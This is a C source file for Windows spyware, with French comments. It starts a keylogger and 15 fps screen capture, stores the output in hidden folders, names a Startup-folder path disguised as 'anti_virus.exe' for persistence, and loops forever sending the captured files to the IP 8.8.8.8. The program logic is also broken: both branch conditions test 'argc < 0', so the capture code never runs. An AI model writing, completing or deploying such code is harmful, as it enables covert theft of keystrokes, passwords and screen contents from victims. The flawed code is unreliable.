#include "keylogger.h"
#include "screen.h"
#include "for_all.c"

const char *output_dir = ".output_screen";
const char *output_file = ".output_text/text.txt";
const char *output_file_dir = ".output_text";

const char *window_start_path = "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\anti_virus.exe";

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#define SLEEP(ms) Sleep(ms)

int start(char *executable, char *args) {
    // Définir l'exécutable et les arguments à passer
    //const char *args = "argument1 argument2";  // Les arguments à passer

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Créer le processus et lui passer les arguments
    if (!CreateProcess(
            executable,          // Nom de l'exécutable
            (char*)args,         // Arguments en tant que chaîne de caractères
            NULL,                // Sécurité du processus
            NULL,                // Sécurité du thread
            FALSE,               // Héritage des descripteurs
            0,                   // Drapeaux de création
            NULL,                // Environnement
            NULL,                // Répertoire de travail
            &si,                 // Informations de démarrage
            &pi                  // Informations sur le processus
        )) {
        printf("Échec de CreateProcess (%d).\n", GetLastError());
        return 1;
    }

    // Attendre que le programme enfant se termine
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Fermer les handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}

int main(int argc, char *argv[]) {
    char path[2048];
    mkdir(output_file_dir, 0755);

    // Récupérer le chemin de l'exécutable
    if (GetModuleFileName(NULL, path, sizeof(path)) == 0) {
        printf("Erreur lors de la récupération du chemin de l'exécutable\n");
        return 1;
    }

    if (argc < 0){
        start(path, "1");
        start(path, "2");



    } else if (argc < 0) {
        if (strcmp(argv[0], "1") == 0){
            start_keylogger(output_file);
        }
        else {
            capture_screen_at_fps(15, output_dir);
        }
    }
    while (1){
        SLEEP(18000 * 1000);
        send_dir(output_dir, "8.8.8.8");
        send_dir(output_file, "8.8.8.8");
    }
}